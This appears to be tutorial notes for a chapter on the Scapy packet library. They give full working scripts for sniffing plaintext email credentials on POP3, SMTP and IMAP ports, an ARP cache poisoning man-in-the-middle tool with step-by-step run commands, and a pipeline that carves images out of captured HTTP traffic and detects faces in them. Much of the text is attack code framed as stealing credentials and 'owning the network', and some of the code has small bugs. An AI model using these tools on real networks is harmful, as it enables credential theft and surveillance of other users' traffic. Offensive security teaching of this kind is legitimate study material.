# Chapter 4: Owning the Network With Scapy

# Scapy

Scapy is a powerful interactive packet manipulation program and library that allows you to send, sniff, dissect, and forge network packets. It can be used to perform a variety of tasks related to network testing, penetration testing, and network reconnaissance.

Scapy is written in Python and provides a simple and intuitive interface that allows you to create and manipulate packets using a high-level API. It also allows you to interact with the lower-level packet structures, making it a versatile tool for network analysis.

With Scapy, you can easily create custom packets, modify existing packets, and send them to a target network. You can also capture and analyze network traffic, extract information from packets, and perform various types of network attacks.

One of the key advantages of Scapy is its flexibility and extensibility. It supports a wide range of protocols and packet types, and allows you to create your own custom protocols and packet structures. This makes it a valuable tool for both network administrators and security professionals.

In conclusion, Scapy is a powerful tool for network testing, analysis, and attack. Its versatility and ease of use make it a valuable addition to any security toolkit.

# **Stealing Email Credentials**

After learning about Python sniffing, we will explore Scapy's sniffing and packet dissection interface. We will create a basic sniffer to obtain SMTP, POP3, and IMAP credentials. When combined with an ARP poisoning MITM attack, this sniffer can be used to steal credentials from other machines on the network. It can also be used to capture all traffic or any other protocol.

### `sniff(filter="", iface="any", prn=function, count=N)`

`sniff()` function in Scapy can capture and analyze network traffic with arguments such as `filter`, `iface`, `prn`, and `count`.

- `filter` specifies the type of traffic to capture.
- `iface` specifies the network interface to use.
- `prn` is the function for analyzing each packet.
- `count` specifies the maximum number of packets to capture.

For example, to capture all HTTP traffic on the `eth0` interface:

```python
sniff(filter="tcp port 80", iface="eth0", prn=process_packet)
```

## `mail_sniffer.py`

```python
from scapy.all import sniff

def packet_callback(packet):
    print(packet.show())

def main():
    sniff(prn=packet_callback, count=1)

if __name__ == '__main__':
    main()
```

The code above shows an example of using Scapy's `sniff()` function to capture and analyze network traffic. The `packet_callback()` function is defined to process each packet captured by the sniffer. In this example, the `count` parameter is set to 1, so the sniffer will stop after capturing a single packet.

When `main()` is called, it invokes `sniff()` and passes `packet_callback()` as the argument for `prn`. This means that `packet_callback()` will be called for every packet captured by the sniffer. In this example, `packet.show()` is called for each packet to display its contents.

## Filters

![Screenshot 2023-06-21 at 11.02.23 AM.png](Chapter%204%20Owning%20the%20Network%20With%20Scapy%20ec1c8a20fb7a4e9ca6332b299dcacb1a/Screenshot_2023-06-21_at_11.02.23_AM.png)

```python
from scapy.all import sniff, TCP, IP

# the packet callback
def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

def main():
    # fire up the sniffer
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',
          prn=packet_callback, store=0)

if __name__ == '__main__':
    main()
```

The code above uses Scapy to create a sniffer that captures SMTP, POP3, and IMAP credentials from network traffic. The `packet_callback()` function is defined to process each packet captured by the sniffer. In this example, the `filter` parameter is set to capture traffic on common **email ports** **110(POP3)**, **25(SMTP)**, and **143(IMAP)**. When a packet is captured, the `packet_callback()` function checks if it contains the words "user" or "pass". If it does, it prints the destination IP address and the payload of the packet.

To use this code, simply copy and paste it into a Python file and run it.

# **ARP Cache Poisoning with Scapy**

ARP cache poisoning is an attack where an attacker sends forged ARP messages to the victim's computer, tricking it into thinking that the attacker's computer is the gateway. This allows the attacker to intercept and manipulate network traffic between the two hosts. Scapy can be used to perform ARP cache poisoning attacks by sending forged ARP messages to the victim's computer.

### `arper.py`

```python
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

""""
helper function to get the MAC address for any given machine
"""
# pass in the target IP address and create a packet
def get_mac(targetip):

    # Ether -> specifies -> packet is to be boradcast
    # ARP -> specifies -> the request for the MAC address
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)

    # send the packet with the Scapy function srp
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)

    for _, r in resp:
        return r[Ether].src
    return None

class Arper:

    """
    initialize the class with the victim and gateway IPs and specify the interface to use
    """
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)

    """"
    The run method performs the main work of the Arper object
    """
    def run(self):
        # poison the ARP cache
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        # watch the attack in progress by sniffing the network traffic
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    """"
    The poison method creates the poisoned packets and sends them to the victim and the gateway
    """
    def poison(self):
        
        # creating a poisoned ARP packet intended for the victim
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)

        # create a poisoned ARP packet for the gateway
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac_src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')

        """
        start sending the poisoned packets to their destinations in an infinite loop to make sure that the respective ARP cache entries remain poisoned for the duration of the attack
        """
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            
            # The loop will continue until you press CTRL-C (KeyboardInterrupt)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    """"
    In order to see and record the attack as it happens, we sniff the network traffic with the sniff method
    """
    def sniff(self, count=200):
        # sniff method sleeps for n seconds
        time.sleep(5)
        print(f'Sniffing {count} packets')

        # filtering for packets that have the victim’s IP
        bpf_filter = "ip host %s" % victim

        # sniffs for a number of packets
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)

        # Once we’ve captured the packets, we write them to a file called "arper.pcap"
        wrpcap('arper.pcap', packets)
        print('Got the packets')

        # restore the ARP tables to their original values; terminate the poisoning thread
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    """"
    the restore method puts the victim and gateway machines back to their original state by sending correct ARP information to each machine:
    """
    def restore(self):
        print('Restoring ARP tables...')
        
        # sends the original values for the gateway IP and MAC addresses to the victim
        send(ARP(
        op=2,
        psrc=self.gateway,
        hwsrc=self.gatewaymac,
        pdst=self.victim,
        hwdst='ff:ff:ff:ff:ff:ff'),
        count=5)

        # sends the original values for the victim’s IP and MAC to the gateway
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)      

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
```

1. The code defines a class called `Arper`.
2. The `Arper` class is initialized with the IP addresses of the victim and the gateway, as well as the network interface to use.
3. The `run()` method of the `Arper` class is called to start the ARP cache poisoning attack.
4. The `poison()` method of the `Arper` class is called to create two ARP packets, one for the victim and one for the gateway, and send them to their respective targets.
5. The `sniff()` method of the `Arper` class is used to capture network traffic that flows between the victim and the gateway.
6. The packets that are captured by the `sniff()` method are saved to a file called "arper.pcap".
7. The `restore()` method of the `Arper` class is called to put the victim and gateway computers back to their original state by sending correct ARP information to each machine.
8. To use this code, the user must provide the IP addresses of the victim and the gateway, as well as the network interface to use, as command-line arguments.

The ARP cache poisoning attack works as follows:

1. The attacker sends forged ARP messages to the victim's computer, tricking it into thinking that the attacker's computer is the gateway.
2. This allows the attacker to intercept and manipulate network traffic between the victim and the gateway.
3. The `poison()` method creates two ARP packets with fake information that causes the victim's computer to think that the attacker's computer is the gateway, and the gateway's computer to think that the attacker's computer is the victim.
4. After the ARP cache is poisoned, the `sniff()` method captures network traffic that flows between the victim and the gateway.
5. The captured packets are saved to a file called `"arper.pcap"`.
6. The `restore()` method puts the victim and gateway computers back to their original state by sending correct ARP information to each machine.

Overall, this code demonstrates how Scapy can be used to perform an ARP cache poisoning attack and capture network traffic.

### How to run the code:

1. run the following command on your attacher machine (Kali VM) with root permission:
    
    ```bash
    #:> echo 1 > /proc/sys/net/ipv4/ip_forward
    ```
    
    In apple machine:
    
    ```bash
    #:> sudo sysctl -w net.inet.ip.forwarding=1
    ```
    
2. execute the python script with root terminal:
    
    ```bash
    #:> python arper.py <Target IP> <Attacker IP> <Attacker internet interface>
    
    E.G: #:> python arper.py 192.168.1.193 192.168.1.254 en0
    ```
    
3. Use CTRL-C to terminate poisoning when you are done.

# `pcap` Processing

We will approach this task from a different perspective by extracting image files from HTTP traffic. Once we have these image files, we will utilize OpenCV (**[http://www.opencv.org/](http://www.opencv.org/)**), a computer vision tool, to detect human faces in the images. This will help us filter out and focus on the images that are potentially interesting.

This example focuses on two tasks: extracting images from HTTP traffic and detecting faces within those images. To accomplish this, we have two separate programs: `recapper.py` and `detector.py`.

`Recapper.py` analyzes a pcap file, extracts any images found in the network streams, and saves them to disk.

`Detector.py` processes the saved image files, identifies faces within them, and generates new images with highlighted face regions.

### `recapper.py`

```python
from scapy.all import TCP, rdpcap
import collections
import os
import re
import sys
import zlib

""""
specify the location of the directory in which to output the images and the location of the pcap file to read
"""
OUTDIR = '/root/Desktop/pictures'
PCAPS = '/root/Downloads'

Response = collections.namedtuple('Response', ['header', 'payload'])

""""
The get_header function takes the raw HTTP traffic and spits out the
headers.
"""
def get_header(payload):
    try:
        # extracting the header portion -> finding the index of the double -> slicing the payload accordingly 
        header_raw = payload[:payload.index(b'\\r\\n\\r\\n')+2]
    except ValueError:
        sys.stdout.write('-')
        sys.stdout.flush()
        return None
    
    # create a dictionary (header) from the decoded payload -> spliting on the colon
    header = dict(re.findall(r'(?P<name>.*?): (?P<value>.*?)\\r\\n', header_raw.decode()))
    if 'Content-Type' not in header:
        # header doesn’t contain the data we want to extract
        return None
    return header

""""
The extract_content function takes the HTTP response and the name for the content type we want to extract.
"""
def extract_content(response, content_name='image'):

    content, content_type = None, None
    
    if content_name in Response.header['Content-Type']:

        # actual content type specified in the header
        content_type = Response.header['Content-Type'].split('/')[1]

        # hold the content itself
        content = Response.payload[Response.payload.index(b'\\r\\n\\r\\n')+4:]

        # If the content has been encoded
        if 'Content-Encoding' in Response.header:
            # decompress the content by using the zlib module
            if Response.header['Content-Encoding'] == "gzip":
                content = zlib.decompress(Response.payload, zlib.MAX_WBITS | 32)
            elif Response.header['Content-Encoding'] == "deflate":
                content = zlib.decompress(Response.payload)

    # return a tuple of the content and content_type
    return content, content_type

class Recapper:
    # initialize the object
    def __init__(self, fname):
        pcap = rdpcap(fname)

        # feature of Scapy to automatically separate each TCP session
        self.sessions = pcap.sessions()
        # empty list -> fill in with the responses from the pcap file
        self.responses = list()

    """"
    read responses from the pcap file.
    traverse the packets to find each separate Response and add each one to the list of responses present in the packet stream.
    """
    def get_responses(self):
        # iterate over the sessions dictionary
        for session in self.sessions:
            payload = b''
            # iterate over the packets within each session
            for packet in self.sessions[session]:
                try:
                    # only packets with a destination or source port of 80
                    if packet[TCP].dport == 80 or packet[TCP].sport == 80:

                        # concatenate the payload of all the traffic into a single buffer
                        payload += bytes(packet[TCP].payload)

                # If we don’t succeed in appending -> print an x to the console & continue
                except IndexError:
                    sys.stdout.write('x')
                    sys.stdout.flush()

            # if the payload byte string is not empty
            if payload:
                # pass it off to the HTTP header-parsing function get_header
                header = get_header(payload)
                if header is None:
                    continue
                # append the Response to the responses list
                self.responses.append(Response(header=header, payload=payload))

    """"
    write image files contained in the responses to the output directory
    """
    def write(self, content_name):
        # iterate over the responses
        for i, response in enumerate(self.responses):
            # extract the content
            content, content_type = extract_content(response, content_name)
            if content and content_type:
                fname = os.path.join(OUTDIR, f'ex_{i}.{content_type}')
                print(f'Writing {fname}')
                with open(fname, 'wb') as f:
                    # write that content to a file
                    f.write(content)

if __name__ == '__main__':
    pfile = os.path.join(PCAPS, 'pcap.pcap')
    recapper = Recapper(pfile)
    recapper.get_responses()
    recapper.write('image')
```

The code above demonstrates how to extract images from a packet capture (pcap) file using Scapy.

The `Recapper` class is initialized with the pcap file name, and the `get_responses()` method is used to read the responses from the pcap file. The method iterates over the sessions within the pcap file and concatenates the payload of all the traffic into a single buffer. Then, it passes the buffer to the `get_header()` function to extract the HTTP headers. If the headers contain the specified content type, the `extract_content()` method extracts the content and saves it to a file.

The `write()` method writes image files contained in the responses to the output directory. It iterates over the responses and uses the `extract_content()` method to extract the content of the specified content type. If the content exists, it writes the content to a file with the extension specified by the content type.

To use this code, the user must provide the path of the pcap file in the `Recapper` class initialization and specify the content type to extract in the `write()` method.

Overall, this code demonstrates how Scapy can be used to extract images from a pcap file.

### `detector.py`

```python
import cv2
import os

ROOT = '/root/Desktop/pictures'
FACES = '/root/Desktop/faces'
TRAIN = '/root/Desktop/training'

def detect(srcdir=ROOT, tgtdir=FACES, train_dir=TRAIN):
    for fname in os.listdir(srcdir):
        # iterates over the JPG files
        if not fname.upper().endswith('.JPG'):
            continue
        fullname = os.path.join(srcdir, fname)
        newname = os.path.join(tgtdir, fname)
        # read the image by using the OpenCV computer vision library cv2
        img = cv2.imread(fullname)
        if img is None:
            continue
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        training = os.path.join(train_dir, 'haarcascade_frontalface_alt.xml')
        # create the cv2 face detector object
        cascade = cv2.CascadeClassifier(training)
        rects = cascade.detectMultiScale(gray, 1.3, 5)
        try:
            # in which faces are found
            if rects.any():
                print('Got a face')
                # Python slice syntax to convert from one form to another
                rects[:, 2:] += rects[:, :2]
        except AttributeError:
            print(f'No faces found in {fname}.')
            continue
        # highlight the faces in the image
        for x1, y1, x2, y2 in rects:
            # draw a green box around the face
            cv2.rectangle(img, (x1, y1), (x2, y2), (127, 255, 0), 2)
        # write the image to the output directory
        cv2.imwrite(newname, img)

if __name__ == '__main__':
    detect()
```

The code above demonstrates how to detect human faces in images using the OpenCV computer vision library.

The `detect()` function takes the path of the source directory (`srcdir`), target directory (`tgtdir`), and training directory (`train_dir`) as input. The function iterates over the JPG files in the source directory and reads each image using the `cv2.imread()` function from OpenCV. If the image is successfully read, the function converts it to grayscale using `cv2.cvtColor()` and creates a face detector object using the `cv2.CascadeClassifier()` function with the Haar Cascade training data file (`haarcascade_frontalface_alt.xml`) stored in the training directory.

The `cv2.CascadeClassifier.detectMultiScale()` function is used to detect faces in the grayscale image. If one or more faces are detected, the function draws a green box around each face using `cv2.rectangle()` and saves the image to the target directory using `cv2.imwrite()`.

To use this code, the user must specify the source directory, target directory, and training directory in the function call.

Overall, this code demonstrates how OpenCV can be used to detect human faces in images.

## **Kicking the Tires (Kali VM)**

- installed the OpenCV libraries:
    
    ```python
    #:> apt-get install libopencv-dev python3-opencv python3-numpy python3-scipy
    ```
    
- grab the facial detection training file:
    
    ```python
    #:> wget http://eclecti.cc/files/2008/03/haarcascade_frontalface_alt.xml
    ```
    
    Copy the downloaded file to the directory we specified in the TRAIN variable in *`detector.py`.*
    
- create a couple of directories for the output, drop in a pcap, and run the scripts:
    
    ```python
    #:> mkdir /root/Desktop/pictures
    #:> mkdir /root/Desktop/faces
    #:> python recapper.py
    ```
    
    ```python
    #:> python detector.py
    ```